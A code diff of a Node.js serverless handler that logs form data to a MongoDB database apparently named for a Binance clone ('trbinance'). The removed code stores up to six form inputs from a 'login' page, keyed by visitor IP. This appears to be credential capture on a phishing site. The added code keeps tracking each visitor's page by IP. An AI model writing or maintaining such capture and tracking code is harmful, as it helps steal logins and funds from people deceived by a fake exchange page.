@@ -31,25 +31,14 @@ module.exports = async (req, res) => {
 
   try {
     const body = await readBody(req);
-    const {
-      page = 'login',
-      inputs = {}
-    } = body || {};
+    const { page } = body || {};
+
+    if (!page || typeof page !== 'string') {
+      return res.status(400).json({ error: 'Missing page value' });
+    }
 
     const ip = getClientIp(req);
     const now = new Date();
-
-    const doc = {
-      page: String(page || 'unknown').slice(0, 120),
-      ip,
-      updatedAt: now
-    };
-
-    for (let i = 1; i <= 6; i += 1) {
-      const key = `input${i}`;
-      const value = inputs[key];
-      doc[key] = value !== undefined && value !== null ? String(value).slice(0, 512) : '';
-    }
 
     const client = await clientPromise;
     const db = client.db(process.env.MONGODB_DB || 'trbinance');
@@ -58,15 +47,17 @@ module.exports = async (req, res) => {
     await logs.updateOne(
       { ip },
       {
-        $set: doc,
-        $setOnInsert: { createdAt: now }
+        $set: {
+          page: page.slice(0, 120),
+          updatedAt: now
+        }
       },
-      { upsert: true }
+      { upsert: false }
     );
 
-    return res.status(201).json({ ok: true });
+    return res.status(200).json({ ok: true });
   } catch (err) {
-    console.error('Form log error', err);
+    console.error('Log page update error', err);
     return res.status(500).json({ error: 'Internal server error' });
   }
 };
